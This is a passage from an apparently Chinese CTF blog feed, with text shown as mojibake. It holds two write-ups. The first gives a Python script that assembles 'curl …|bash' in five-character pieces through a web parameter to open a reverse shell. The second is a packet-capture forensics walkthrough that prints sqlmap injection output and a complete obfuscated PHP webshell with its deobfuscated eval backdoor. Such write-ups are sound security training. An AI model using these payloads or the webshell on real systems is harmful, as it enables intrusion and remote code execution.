href="https://imgchr.com/i/iCeaFI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCeaFI.md.png" alt="iCeaFI.md.png"></a></p><p>å¼€å§‹ç›‘å¬ç«¯å£<br><img src="https://s1.ax1x.com/2018/09/06/iCeBSf.png" alt="iCeBSf.png"></p><p>ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">'&gt;ls\\'</span>, </span><br><span class="line">    <span class="string">'ls&gt;_'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;-t\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line">    <span class="string">'ls&gt;&gt;_'</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate `curl orange.tw.tw|python`</span></span><br><span class="line">    <span class="comment"># generate `curl 10.188.2.20|bash` </span></span><br><span class="line">    <span class="string">'&gt;sh\ '</span>, </span><br><span class="line">    <span class="string">'&gt;ba\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">    <span class="string">'&gt;6\\'</span>,  </span><br><span class="line">    <span class="string">'&gt;10\\'</span>,</span><br><span class="line">    <span class="string">'&gt;1.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;8.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;16\\'</span>, </span><br><span class="line">    <span class="string">'&gt;2.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;19\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># exec</span></span><br><span class="line">    <span class="string">'sh _'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://192.168.1.104:49200//?reset=1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.get(<span class="string">'http://192.168.1.104:49200//?cmd='</span> + quote(i) )</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure><p>åå¼¹webshellæˆåŠŸ<br>ç„¶ååœ¨<code>/home</code>ç›®å½•ä¸‹å‘ç°æœ‰å…³flagçš„ä¸œè¥¿ï¼Œåº”è¯¥æ˜¯åœ¨æ•°æ®åº“é‡Œé¢<br>è¿æ¥ä¸€ä¸‹<br><img src="https://s1.ax1x.com/2018/09/06/iCeDl8.png" alt="iCeDl8.png"><br>äº¤äº’æ€§æå·®ï¼Œæ¯æ¬¡éƒ½è¦exitä¸€ä¸‹æ‰æœ‰å›æ˜¾ï¼Œä¹Ÿæ˜¯æœæ°”ã€‚ã€‚ã€‚ä½†æœ€åè¿˜æ˜¯å¾—åˆ°flagäº†<br><a href="https://imgchr.com/i/iCer6S" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCer6S.md.png" alt="iCer6S.md.png"></a></p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å…¶å®è¿™ä¸ªé¢˜ç›®è¿˜æœ‰å…¶ä»–éªšæ“ä½œï¼Œæ¯”å¦‚ç”¨åˆ©ç”¨<code>wget</code>ï¼Œä»¥åŠç›´æ¥æ„é€ ä¸€ä¸ªæ¯”è¾ƒéªšæ°”çš„åŸŸåã€‚ã€‚è¿™åŸŸåæä¸æ¥ï¼Œæˆ‘å°±æ²¡æœ‰å°è¯•äº†ï¼Œè‡³äºwgetæ–¹æ³•çš„è¯ä¸‹æ¬¡å¤ç°ä¸€ä¸‹2015å¹´çš„babyfirståœ¨å°è¯•ä¸€ä¸‹<br>å°ç»“ä¸€æ³¢ï¼Œè¿™ä¸ªé¢˜ç›®æ”¶è·å¾ˆå¤§ï¼Œå…ˆæ¥è®²è¿™ä¸ªä¸œè¥¿å…¶å®æ˜¯å…³ä¹å¯¹Linuxç³»ç»Ÿå„ç§ç¼©å°ç‰ˆç±³æ˜‚é¢†çš„ç†Ÿæ‚‰ç¨‹åº¦ï¼Œæ¯”å¦‚æ€æ ·èƒ½å¿«é€Ÿæ–°å»ºæ–‡ä»¶è¿™é‡Œå°±ç”¨äº†&gt;è¿™ä¸ªç¬¦å·å»åˆ›å»ºï¼Œè¿˜æœ‰é€šè¿‡ç®¡é“ç¬¦å»æ‰§è¡Œbashå‘½ä»¤(è¿™ä¸€ç‚¹å°±å¯ä»¥ç»§ç»­å»æ¨è¡Œè¿˜å¯ä»¥ä½¿ç”¨pythonï¼Œphpä¸€ç³»åˆ—çš„å‘½ä»¤ç»“åˆå„ç§è¯­è¨€åå¼¹webshellçš„æ“ä½œ)ï¼Œè¿™éƒ½æ˜¯æˆ‘æƒ³ä¸åˆ°çš„ä¸œè¥¿ï¼Œå½’æ ¹åˆ°åº•æ˜¯å­¦çš„ä¸œè¥¿è¿˜æ˜¯ä¸èƒ½å¤Ÿçµæ´»ä½¿ç”¨<br>é¡ºä¾¿åæ§½ä¸€ä¸‹ï¼Œæœ€è¿‘çš„ç®—æ³•è¯¾æ‡µé€¼å¾—å¾ˆï¼Œå…¨éƒ½è·Ÿé«˜æ•°çš„çº§æ•°æ”¶æ•›è¿˜æœ‰æ³°å‹’å±•å¼€æ‰¯ä¸Šå…³ç³»ï¼Œçªç„¶ææƒ§ï¼Œè¿˜å¾—é‡æ–°ç”¨C++å†™ojä¸Šçš„ç®—æ³•é¢˜ç›®ï¼Œéƒ½æ˜¯äº›å¤§ä½¬ã€‚ã€‚æˆ‘åšå®Œçš„æ—¶å€™ä»–ä»¬éƒ½ä¸çŸ¥é“akå¤šä¹…äº†ã€‚ã€‚ã€‚<br><a href="https://imgchr.com/i/iCeb79" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCeb79.md.png" alt="iCeb79.md.png"></a></p><p>ææ€•9æœˆä»½éš¾ç†¬23333.ã€‚ã€‚ã€‚</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> å‘½ä»¤æ‰§è¡Œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>é“ä¸‰2018.5.5æ•°æ®åˆ†æ</title>
      <link href="/liuliangfenxi-5-5.html"/>
      <url>/liuliangfenxi-5-5.html</url>
      <content type="html"><![CDATA[<blockquote><p>keep learning</p></blockquote><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>é“¾æ¥: <a href="https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ</a> å¯†ç : nux4<br>æ„Ÿè°¢æ–¹æ–¹åœŸå­¦é•¿çš„<a href="http://skysec.top/2018/05/30/2018.5.5ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›æ•°æ®èµ›é¢˜è§£/" target="_blank" rel="noopener">é¢˜è§£</a>ï¼Œå­¦ä¹ åˆ°<a id="more"></a>äº†ä¸€å®šçš„å¥—è·¯</p><p>é¢˜ç›®æè¿°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.é»‘å®¢æ”»å‡»çš„ç¬¬ä¸€ä¸ªå—å®³ä¸»æœºçš„ç½‘å¡IPåœ°å€</span><br><span class="line">2.é»‘å®¢å¯¹URLçš„å“ªä¸€ä¸ªå‚æ•°å®æ–½äº†SQLæ³¨å…¥</span><br><span class="line">3.ç¬¬ä¸€ä¸ªå—å®³ä¸»æœºç½‘ç«™æ•°æ®åº“çš„è¡¨å‰ç¼€(åŠ ä¸Šä¸‹åˆ’çº¿ ä¾‹å¦‚abc_)</span><br><span class="line">4.ç¬¬ä¸€ä¸ªå—å®³ä¸»æœºç½‘ç«™æ•°æ®åº“çš„åå­—</span><br><span class="line">5.Joomlaåå°ç®¡ç†å‘˜çš„å¯†ç æ˜¯å¤šå°‘</span><br><span class="line">6.é»‘å®¢ç¬¬ä¸€æ¬¡è·å¾—çš„phpæœ¨é©¬çš„å¯†ç æ˜¯ä»€ä¹ˆ</span><br><span class="line">7.é»‘å®¢ç¬¬äºŒæ¬¡ä¸Šä¼ phpæœ¨é©¬æ˜¯ä»€ä¹ˆæ—¶é—´</span><br><span class="line">8.ç¬¬äºŒæ¬¡ä¸Šä¼ çš„æœ¨é©¬é€šè¿‡HTTPåè®®ä¸­çš„å“ªä¸ªå¤´ä¼ é€’æ•°æ®</span><br><span class="line">9.å†…ç½‘ä¸»æœºçš„mysqlç”¨æˆ·åå’Œè¯·æ±‚è¿æ¥çš„å¯†ç hashæ˜¯å¤šå°‘(ç”¨æˆ·:å¯†ç hash)</span><br><span class="line">10.phpä»£ç†ç¬¬ä¸€æ¬¡è¢«ä½¿ç”¨æ—¶æœ€å…ˆè¿æ¥äº†å“ªä¸ªIPåœ°å€</span><br><span class="line">11.é»‘å®¢ç¬¬ä¸€æ¬¡è·å–åˆ°å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨çš„æ¼æ´åˆ©ç”¨è¯·æ±‚å‘ç”Ÿåœ¨ä»€ä¹ˆæ—¶å€™</span><br><span class="line">12.é»‘å®¢åœ¨å†…ç½‘ä¸»æœºä¸­æ·»åŠ çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯å¤šå°‘</span><br><span class="line">13.é»‘å®¢ä»å†…ç½‘æœåŠ¡å™¨ä¸­ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶å</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹çœ‹è¿™äº›åŒ…éƒ½æ˜¯æŒ‰æ—¶é—´é¡ºåºå‘½åçš„<br><img src="https://s1.ax1x.com/2018/09/06/iCAIZn.png" alt="iCAIZn.png"><br>å…ˆæ‰“å¼€ç¬¬ä¸€ä¸ªåŒ…<br>ä¸€èˆ¬é»‘å®¢æ”»å‡»å…ˆä»åº”ç”¨å±‚å‘èµ·æ”»å‡»ï¼Œæ‰€ä»¥å…ˆè¿‡æ»¤<code>http</code>çœ‹ä¸€ä¸‹<br>å‘ç°ipä¸º<code>202.1.1.2</code>å¯¹<code>192.168.1.8</code>æœ‰å¾ˆæ˜æ˜¾çš„çˆ†ç ´ç—•è¿¹ï¼ŒæŠŠé‡Œé¢çš„urlçš„å†…å®¹urldecodeä¸€ä¸‹ä¼šå‘ç°æ˜æ˜¾çš„sqlæŸ¥è¯¢è¯­å¥ï¼Œè€Œä¸”æœ‰å¾ˆæ˜æ˜¾sqlmapæŒ‡çº¹ç—•è¿¹<br><img src="https://s1.ax1x.com/2018/09/06/iCAbGT.png" alt="iCAbGT.png"></p><p>æ‰€ä»¥å°±è§£å†³äº†å—å®³ä¸»æœºipæ˜¯<code>192.168.1.8</code><br>æˆ‘ä»¬å†è¯¦ç»†è¿‡æ»¤ä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http and ip.src == 202.1.1.2</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°æ¯”è¾ƒè¯¦ç»†çš„çˆ†ç ´è¿‡ç¨‹ï¼Œæ ‡è®°ä¸€ä¸‹æœ€åä¸€ä¸ªï¼Œç„¶åè¿”å›httpæŸ¥çœ‹ä»–çš„response<br><a href="https://imgchr.com/i/iCAqRU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCAqRU.md.png" alt="iCAqRU.md.png"></a></p><p>å¾ˆæ˜æ˜¾äº†ï¼Œæ³¨å…¥çš„å‚æ•°æ˜¯<code>list[select]</code>,å¹¶ä¸”åº”è¯¥æ˜¯ä½¿ç”¨äº†<code>æŠ¥é”™æ³¨å…¥</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span>\n</span><br><span class="line">   <span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span> <span class="attr">xml:lang</span>=<span class="string">"en-gb"</span> <span class="attr">lang</span>=<span class="string">"en-gb"</span> <span class="attr">dir</span>=<span class="string">"ltr"</span>&gt;</span>\n</span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span>\n</span><br><span class="line">   \t<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span>\n</span><br><span class="line">    [truncated]\t<span class="tag">&lt;<span class="name">title</span>&gt;</span>Error: 500 XPATH syntax error: &amp;#039;qqzvqadminqqkkq&amp;#039; SQL=SELECT (UPDATEXML(6315,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71</span><br><span class="line">   FROM `ajtuc_ucm_history` AS h\n</span><br><span class="line">   LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id\n</span><br></pre></td></tr></table></figure><p>è€Œä¸”è¿˜å¯ä»¥ä»å“åº”é‡Œé¢å‘ç°æ˜¯ä»<code>joomla.ajtuc_users</code>è¡¨é‡Œé¢æ³¨å…¥çš„ä¸œè¥¿ï¼Œä¹ŸçŸ¥é“äº†å‰ç¼€ä¸º<code>ajtuc</code>ï¼ŒåŒæ—¶ä¹ŸçŸ¥é“äº†æ•°æ®åº“ä¸º<code>joomla</code>ã€‚ç¬¬ä¸‰å››é¢˜è§£å†³</p><p>ç„¶åè¦æ‰¾ç™»å½•åå°çš„å¯†ç ï¼Œä½†æ˜¯è¿™é‡Œç›´æ¥<code>contains &quot;password&quot;</code>æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œæˆ‘ä»¬è¿™æ—¶å€™å°±å¾—è½¬æ¢æ€è·¯å°±æ˜¯è¯´é»‘å®¢æ˜¯ä»æ•°æ®åº“é‡ŒæŠŠå¯†ç çˆ†å‡ºæ¥çš„<br>å¦‚æœä»”ç»†çœ‹è¿™ä¸ªé»‘å®¢çš„è¡Œä¸ºçš„è¯ï¼Œä»–äº‹å…ˆå°è¯•ç™»å½•å‘ç°ä¸è¡Œæ‰ç”¨çš„SQLæ³¨å…¥ï¼Œæ‰€ä»¥ä¹Ÿå°±è·Ÿç€è¿™ä¸ªæ€è·¯æ¥èµ°äº†</p><p>æ—¢ç„¶æŠ¥é”™æ³¨å…¥ï¼Œé‡Œé¢å¿…å«æœ‰passwordçš„å…³é”®å­—ä»¥åŠè¡¨åï¼Œç«‹å³è¿‡æ»¤<br><code>ip.src == 202.1.1.2 and http contains &quot;password&quot; and http contains &quot;joomla.ajtuc_users&quot;</code><br>å‘ç°æœ‰ä¸‰æ¡ï¼Œæ ‡è®°ä¸€ä¸‹æŸ¥çœ‹ä»–ä»¬çš„response<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Status: 500 XPATH syntax error: &apos;qqzvq$2y$10$lXujU7XaUviJDigqqkkq&apos; </span><br><span class="line">Status: 500 XPATH syntax error: &apos;qqzvqFMzKy6.wx7EMCBqpzrJdn7qqkkq&apos; </span><br><span class="line">Status: 500 XPATH syntax error: &apos;qqzvqzi/8B2QRD7qIlDJeqqkkq&apos;</span><br></pre></td></tr></table></figure></p><p>å†æ¥æŸ¥çœ‹ä¸€ä¸‹æŠ¥é”™æ³¨å…¥æ˜¯è¿™æ ·çš„ï¼Œå­˜åœ¨æ‹¼æ¥<code>0x71717a7671</code>ï¼Œè§£ç ä¸€ä¸‹<code>qqzvq</code><br><code>UPDATEXML(5928,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),1,22</code>ï¼Œæ‰€ä»¥å¾—æŠŠqqzvqå‰ç¼€å»æ‰</p><p><code>$2y$10$lXujU7XaUviJDigqqkkqFMzKy6.wx7EMCBqpzrJdn7qqkkqzi/8B2QRD7qIlDJeqqkkq</code><br>æ‹¼æ¥èµ·æ¥å°±æ˜¯ç»è¿‡åŠ å¯†åçš„å¯†ç ï¼Œå®˜æ–¹ç­”æ¡ˆæ˜¯qwert123ï¼Œä½†è¿˜æ˜¯è§£ä¸å‡ºæ¥</p><p>ç¬¬ä¸€ä¸ªåŒ…é‡Œé¢è¿‡æ»¤<br><code>http.request.method == &quot;POST&quot; and ip.src == 202.1.1.2</code><br><a href="https://imgchr.com/i/iCEeeA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEeeA.md.png" alt="iCEeeA.md.png"></a></p><p>æ²¡å‘ç°æœ‰å¯ç–‘æ•°æ®</p><p>å†æ‰¾ç¬¬äºŒä¸ªåŒ…<br><code>ip.src == 202.1.1.2 and http.request.method == &quot;POST&quot; and http contains &quot;eval&quot;</code>ï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶<code>kkkaaa.php</code><br><a href="https://imgchr.com/i/iCEMJf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEMJf.md.png" alt="iCEMJf.md.png"></a></p><p>å¯ä»¥å‘ç°è¿™é‡Œé¢çš„æ˜¯ä¸€ä¸ªé©¬ï¼Œå¯†ç ä¸º<code>zzz</code><br>ç„¶åæˆ‘ä»¬å†æ ¹æ®è¿™ä¸ªé©¬å»å¯»æ‰¾ä¸Šä¼ çš„çš„ç¬¬äºŒä¸ªé©¬<br>å½“æˆ‘ä»¬ç‚¹åˆ°ç¬¬ä¸‰ä¸ªæŠ¥æ–‡çš„æ—¶å€™å‘ç°å¤šäº†ä¸€ä¸ªå‚æ•°<code>z2</code>ï¼Œæœ‰ç‚¹å¯ç–‘<br><a href="https://imgchr.com/i/iCEQW8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEQW8.md.png" alt="iCEQW8.md.png"></a></p><p>ä¿å­˜å‡ºæ¥çœ‹ä¸€ä¸‹ï¼Œå‘ç°æ˜¯æ®µphpä»£ç ï¼Œ<br><img src="https://s1.ax1x.com/2018/09/06/iCE3Qg.png" alt="iCE3Qg.png"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>.$p=<span class="string">'l&gt;]ower";$i&gt;]=$m[1][0].$m[1]&gt;][1];$h&gt;]=$&gt;]sl($ss(m&gt;]d5($i.&gt;]$kh),0&gt;],3))&gt;];$f=$s&gt;]l($s&gt;]s(md5'</span>;.$d=<span class="string">']q=array_v&gt;]&gt;]alues(&gt;]$q);&gt;]preg_match_a&gt;]ll("/(&gt;][\\w]&gt;])[\\w-&gt;]]+&gt;](?:;q=&gt;]0.([\\d]))?,?/",&gt;'</span>;.$W=<span class="string">'),$ss(&gt;]$s[&gt;]$i],&gt;]0,$e))),$&gt;]&gt;]k)));&gt;]$o=ob_get_content&gt;]&gt;]s();ob_end_&gt;]&gt;]clean();$d=&gt;]base'</span>;.$e=<span class="string">']T_LANGUAGE"];if($rr&gt;]&amp;&amp;$&gt;]ra)&#123;$&gt;]u=pars&gt;]e_&gt;]url($rr);par&gt;]se_st&gt;]r($u["&gt;]query"],$&gt;]q);$&gt;'</span>;.$E=<span class="string">'&gt;]64_e&gt;]ncod&gt;]e&gt;](&gt;]x(gz&gt;]compress($o),$k));pri&gt;]nt("&lt;$k&gt;$d&lt;&gt;]/$k&gt;"&gt;])&gt;];@&gt;]session_destr&gt;]oy();&#125;&#125;&#125;&#125;'</span>;.$t=<span class="string">'($i.&gt;]$kf),0,3&gt;]));$p&gt;]="";fo&gt;]r($z=1&gt;];$z&lt;&gt;]count($m&gt;][1]);$z+&gt;]&gt;]+)$p&gt;].=$q[$m[&gt;]2][$z]];i&gt;'</span>;.$M=<span class="string">']$ra,$&gt;]m);if($q&gt;]&amp;&amp;$m&gt;])&#123;@sessi&gt;]on_sta&gt;]&gt;]rt();$s=&amp;$&gt;]_SESS&gt;]ION;$&gt;]&gt;]s&gt;]s="substr";$sl="s&gt;]&gt;]trto'</span>;.$P=<span class="string">']f(s&gt;]tr&gt;]pos($p&gt;],$h)===0)&#123;$s[&gt;]$i]="";$p&gt;]=$ss($&gt;]p,3);&gt;]&#125;if(ar&gt;]ray&gt;]_key_exist&gt;]&gt;]s($i,$&gt;]s)&gt;])&#123;$&gt;'</span>;.$j=str_replace(<span class="string">'fr'</span>,<span class="string">''</span>,<span class="string">'cfrrfreatfrfre_funcfrtfrion'</span>);.$k=<span class="string">'];&#125;&#125;re&gt;]&gt;]turn $o;&gt;]&#125;$&gt;]r=$_SERV&gt;]ER;$rr=@$r[&gt;]"HTTP&gt;]_REFERE&gt;]R"];$ra&gt;]=@&gt;]$r["&gt;]HTTP_A&gt;]CC&gt;]EP&gt;'</span>;.$g=<span class="string">'"";for(&gt;]$i=&gt;]0;$i&lt;$l;&gt;])&gt;]&#123;for($j=0;($j&lt;&gt;]$c&amp;&amp;&gt;]$i&lt;$l);$&gt;]j++,$i&gt;]++)&#123;$o.&gt;]=$t&#123;$i&gt;]&#125;^$k&#123;$j&#125;&gt;'</span>;.$R=<span class="string">'$k&gt;]h="cb4&gt;]2";$kf="e130"&gt;];functio&gt;]n&gt;] x($t&gt;],$k)&#123;$c=s&gt;]trle&gt;]&gt;]n($k);$l=strle&gt;]n&gt;]($t)&gt;];$o='</span>;.$Q=<span class="string">']s[$i].=$p;$e=strp&gt;]&gt;]os(&gt;]$s[$i&gt;]],$f);if($&gt;]e)&#123;$k=$kh.$k&gt;]f;&gt;]ob_sta&gt;]rt();@e&gt;]val(@gzun&gt;]co&gt;'</span>;.$v=<span class="string">']mpress(@x&gt;](@b&gt;]as&gt;]&gt;]e64_decode(pr&gt;]&gt;]e&gt;]g_repla&gt;]ce(array("/_/","/-/"),arr&gt;]ay(&gt;]"/","+"&gt;]'</span>;.$x=str_replace(<span class="string">'&gt;]'</span>,<span class="string">''</span>,$R.$g.$k.$e.$d.$M.$p.$t.$P.$Q.$v.$W.$E);.$N=$j(<span class="string">''</span>,$x);$N();.<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>è§£æ··æ·†<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump($j);</span><br><span class="line">var_dump($x);</span><br></pre></td></tr></table></figure></p><p>å¾—åˆ°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string(<span class="number">15</span>) <span class="string">"create_function"</span></span><br><span class="line">string(<span class="number">929</span>) <span class="string">"$kh="</span>cb42<span class="string">";$kf="</span>e130<span class="string">";function x($t,$k)&#123;$c=strlen($k);$l=strlen($t);$o="</span><span class="string">";for($i=0;$i&lt;$l;)&#123;for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;&#125;&#125;return $o;&#125;$r=$_SERVER;$rr=@$r["</span>HTTP_REFERER<span class="string">"];$ra=@$r["</span>HTTP_ACCEPT_LANGUAGE<span class="string">"];if($rr&amp;&amp;$ra)&#123;$u=parse_url($rr);parse_str($u["</span>query<span class="string">"],$q);$q=array_values($q);preg_match_all("</span>/([\w])[\w-]+(?:;q=<span class="number">0.</span>([\d]))?,?/<span class="string">",$ra,$m);if($q&amp;&amp;$m)&#123;@session_start();$s=&amp;$_SESSION;$ss="</span>substr<span class="string">";$sl="</span>strtolower<span class="string">";$i=$m[1][0].$m[1][1];$h=$sl($ss(md5($i.$kh),0,3));$f=$sl($ss(md5($i.$kf),0,3));$p="</span><span class="string">";for($z=1;$z&lt;count($m[1]);$z++)$p.=$q[$m[2][$z]];if(strpos($p,$h)===0)&#123;$s[$i]="</span><span class="string">";$p=$ss($p,3);&#125;if(array_key_exists($i,$s))&#123;$s[$i].=$p;$e=strpos($s[$i],$f);if($e)&#123;$k=$kh.$kf;ob_start();@eval(@gzuncompress(@x(@base64_decode(preg_replace(array("</span>/_/<span class="string">","</span>/-/<span class="string">"),array("</span>/<span class="string">","</span>+<span class="string">"),$ss($s[$i],0,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));print("</span>&lt;$k&gt;$d&lt;/$k&gt;<span class="string">");@session_destroy();&#125;&#125;&#125;&#125;"</span></span><br></pre></td></tr></table></figure></p><p>åŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šè¿™æ˜¯ç¬¬äºŒä¸ªé©¬<br>ä¸Šä¼ æ—¶é—´ä¸º<br><code>17:20:44.248365</code><br>ç„¶åé‡æ–°è¿‡æ»¤ä¸€ä¸‹<br><code>ip.src == 202.1.1.2 and http</code>æ ¹æ®æ—¶é—´ä¸Šçš„å…³ç³»ä¹Ÿå¯ä»¥ç¡®å®šç¬¬äºŒä¸Šä¼ çš„é©¬çš„åå­—ä¸º<code>/tmp/footer.php</code></p><p>å…¶å®æˆ‘ä»¬ä¹Ÿå¯ä»¥ä»ä¸Šé¢å‘ç°å…³äºå¤´çš„æ“ä½œæœ‰ä¸¤ä¸ªä¸œè¥¿<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$rr = @$_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">$ra = @$_SERVER[&quot;HTTP_ACCEPT_LANGUAGE&quot;];</span><br></pre></td></tr></table></figure></p><p>çœ‹çš„è·Ÿæ¸…æ¥šä¸€ç‚¹å¯ä»¥è¿½è¸ªå‡ ä¸ª<code>footer</code>çš„æµçœ‹ä¸€ä¸‹<br>æ˜æ˜¾å‘ç°<code>referer</code>æœ‰base64åŠ å¯†ä½†æ˜¯LANGUAGEæ²¡å•¥å˜åŒ–ï¼Œæ‰€ä»¥æœ€åçš„ç­”æ¡ˆåº”è¯¥æ˜¯referer<br><a href="https://imgchr.com/i/iCENoq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCENoq.md.png" alt="iCENoq.md.png"></a></p><p>ç„¶åé¢˜ç›®æŠ›å‡ºmysqlçš„æ“ä½œ<br>åœ¨ç¬¬å››ä¸ªåŒ…é‡Œé¢æ‰æ‰¾åˆ°å…³äºSQLçš„ç›¸å…³åè®®<br><a href="https://imgchr.com/i/iCEbTI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEbTI.md.png" alt="iCEbTI.md.png"></a><br><code>mysql and mysql contains &quot;password&quot;</code><br>è¿‡æ»¤ä¹‹åå¯ä»¥å‘ç°é»‘å®¢åˆåœ¨çˆ†ç ´<br>ç›´æ¥æ‰¾åˆ°æœ€åçš„loginè¯·æ±‚é‡Œé¢çš„hashå€¼å°±æ˜¯<code>password</code><br><a href="https://imgchr.com/i/iCEdYV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEdYV.md.png" alt="iCEdYV.md.png"></a></p><p>ç„¶åå†æ¥è¿‡æ»¤ä¸€æ³¢æŸ¥çœ‹é»‘å®¢ç©¶ç«Ÿ<code>footer.php</code>ä¹‹åçš„æ“ä½œï¼Œå‘ç°æœ‰<code>tunnel</code>è¿™æ ·çš„å…³é”®å­—æ 